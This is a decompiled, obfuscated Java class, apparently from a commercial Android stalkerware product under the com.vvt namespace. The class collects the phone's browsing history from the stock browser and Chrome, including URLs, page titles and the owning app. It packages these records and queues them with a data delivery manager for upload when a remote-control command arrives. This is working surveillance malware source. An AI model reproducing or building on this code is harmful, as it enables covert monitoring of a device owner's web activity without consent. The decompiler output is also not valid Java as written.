package com.vvt.appengine.a;

import android.content.Context;
import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.RunningMode;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.i;
import com.vvt.events.FxBrowserUrlEvent;
import com.vvt.phoenix.prot.command.data.c;
import com.vvt.phoenix.prot.command.v;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class ax
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private ConditionVariable c;
  private com.vvt.datadeliverymanager.a.a d;
  private RmtCtrlOutputStatusMessage e;
  
  public ax()
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.e = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = b();
    this.d = ((com.vvt.datadeliverymanager.a.a)localObject);
  }
  
  private com.vvt.datadeliverymanager.a.a b()
  {
    ay localay = new com/vvt/appengine/a/ay;
    localay.<init>(this);
    return localay;
  }
  
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    boolean bool1 = true;
    for (;;)
    {
      v localv;
      Object localObject5;
      Object localObject6;
      boolean bool4;
      try
      {
        Object localObject1 = new android/os/ConditionVariable;
        boolean bool2 = false;
        localObject4 = null;
        ((ConditionVariable)localObject1).<init>(false);
        this.c = ((ConditionVariable)localObject1);
        localv = new com/vvt/phoenix/prot/command/v;
        localv.<init>();
        localObject1 = paramh.J;
        if (localObject1 == null)
        {
          localObject1 = new com/vvt/capture/browserurl/a;
          localObject4 = paramh.b();
          localObject5 = paramh.d();
          localObject6 = paramh.a();
          localObject7 = paramh.h;
          ((com.vvt.capture.browserurl.a)localObject1).<init>((String)localObject4, (RunningMode)localObject5, (Context)localObject6, (com.vvt.base.a)localObject7);
          paramh.J = ((com.vvt.capture.browserurl.a)localObject1);
        }
        localObject1 = paramh.K;
        Object localObject8;
        Object localObject9;
        if (localObject1 == null)
        {
          localObject1 = new com/vvt/capture/chrome/a;
          localObject4 = paramh.b();
          localObject5 = paramh.d();
          localObject6 = paramh.a();
          localObject7 = paramh.h;
          localObject8 = paramh.c();
          localObject9 = paramh.V;
          ((com.vvt.capture.chrome.a)localObject1).<init>((String)localObject4, (RunningMode)localObject5, (Context)localObject6, (com.vvt.base.a)localObject7, (String)localObject8, (com.vvt.n.a.b)localObject9);
          paramh.K = ((com.vvt.capture.chrome.a)localObject1);
        }
        localObject5 = new java/util/ArrayList;
        ((ArrayList)localObject5).<init>();
        localObject1 = paramh.J;
        localObject6 = ((com.vvt.capture.browserurl.a)localObject1).a();
        bool4 = b;
        if (bool4) {}
        ((List)localObject5).addAll((Collection)localObject6);
        localObject1 = new java/util/ArrayList;
        ((ArrayList)localObject1).<init>();
        localObject4 = paramh.K;
        if (localObject4 != null)
        {
          localObject1 = paramh.K;
          localObject1 = ((com.vvt.capture.chrome.a)localObject1).a();
        }
        bool2 = b;
        if (bool2) {}
        Object localObject7 = ((List)localObject1).iterator();
        bool4 = ((Iterator)localObject7).hasNext();
        if (bool4)
        {
          localObject1 = ((Iterator)localObject7).next();
          localObject1 = (FxBrowserUrlEvent)localObject1;
          localObject8 = ((List)localObject6).iterator();
          bool2 = ((Iterator)localObject8).hasNext();
          if (!bool2) {
            break label677;
          }
          localObject4 = ((Iterator)localObject8).next();
          localObject4 = (FxBrowserUrlEvent)localObject4;
          localObject9 = ((FxBrowserUrlEvent)localObject4).getUrl();
          String str = ((FxBrowserUrlEvent)localObject1).getUrl();
          boolean bool5 = ((String)localObject9).equals(str);
          if (!bool5) {
            continue;
          }
          long l1 = ((FxBrowserUrlEvent)localObject4).getEventTime();
          long l2 = ((FxBrowserUrlEvent)localObject1).getEventTime();
          bool2 = l1 < l2;
          if (bool2) {
            continue;
          }
          bool2 = bool1;
          if (bool2) {
            continue;
          }
          ((List)localObject5).add(localObject1);
          continue;
        }
        bool4 = b;
      }
      finally {}
      if (bool4) {}
      Object localObject4 = ((List)localObject5).iterator();
      for (;;)
      {
        bool4 = ((Iterator)localObject4).hasNext();
        if (!bool4) {
          break;
        }
        localObject3 = ((Iterator)localObject4).next();
        localObject3 = (FxBrowserUrlEvent)localObject3;
        boolean bool6 = b;
        if (bool6) {}
        localObject5 = new com/vvt/phoenix/prot/command/data/c;
        ((c)localObject5).<init>();
        localObject6 = ((FxBrowserUrlEvent)localObject3).getTitle();
        ((c)localObject5).a((String)localObject6);
        localObject6 = ((FxBrowserUrlEvent)localObject3).getUrl();
        ((c)localObject5).b((String)localObject6);
        localObject3 = ((FxBrowserUrlEvent)localObject3).getOwningApp();
        ((c)localObject5).c((String)localObject3);
        localv.a((c)localObject5);
      }
      Object localObject3 = new com/vvt/datadeliverymanager/h;
      ((com.vvt.datadeliverymanager.h)localObject3).<init>();
      int i = 29;
      ((com.vvt.datadeliverymanager.h)localObject3).a(i);
      ((com.vvt.datadeliverymanager.h)localObject3).a(localv);
      localObject4 = this.d;
      ((com.vvt.datadeliverymanager.h)localObject3).a((com.vvt.datadeliverymanager.a.a)localObject4);
      localObject4 = DeliveryRequestType.REQUEST_TYPE_NEW;
      ((com.vvt.datadeliverymanager.h)localObject3).a((DeliveryRequestType)localObject4);
      localObject4 = PriorityRequest.PRIORITY_NORMAL;
      ((com.vvt.datadeliverymanager.h)localObject3).a((PriorityRequest)localObject4);
      localObject4 = DataProviderType.DATA_PROVIDER_TYPE_NONE;
      ((com.vvt.datadeliverymanager.h)localObject3).a((DataProviderType)localObject4);
      i = 15;
      ((com.vvt.datadeliverymanager.h)localObject3).c(i);
      long l3 = 180000L;
      ((com.vvt.datadeliverymanager.h)localObject3).b(l3);
      i = 1;
      ((com.vvt.datadeliverymanager.h)localObject3).c(i);
      boolean bool3 = true;
      ((com.vvt.datadeliverymanager.h)localObject3).b(bool3);
      localObject4 = paramh.g;
      if (localObject4 == null)
      {
        localObject3 = new java/lang/NullPointerException;
        localObject4 = "DDM is not set!!";
        ((NullPointerException)localObject3).<init>((String)localObject4);
        throw ((Throwable)localObject3);
      }
      bool3 = b;
      if (bool3) {}
      localObject4 = paramh.g;
      ((com.vvt.datadeliverymanager.b)localObject4).a((com.vvt.datadeliverymanager.h)localObject3);
      localObject3 = this.c;
      ((ConditionVariable)localObject3).block();
      localObject3 = this.e;
      return (RmtCtrlOutputStatusMessage)localObject3;
      label677:
      bool3 = false;
      localObject4 = null;
    }
  }
  
  void a(i parami)
  {
    RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage1 = this.e;
    if (parami != null) {}
    try
    {
      boolean bool1 = a;
      if (bool1) {}
      RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage2 = this.e;
      boolean bool2 = parami.f();
      localRmtCtrlOutputStatusMessage2.setSuccess(bool2);
      localRmtCtrlOutputStatusMessage2 = this.e;
      String str = parami.e();
      localRmtCtrlOutputStatusMessage2.setMessage(str);
      return;
    }
    finally {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/ax.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */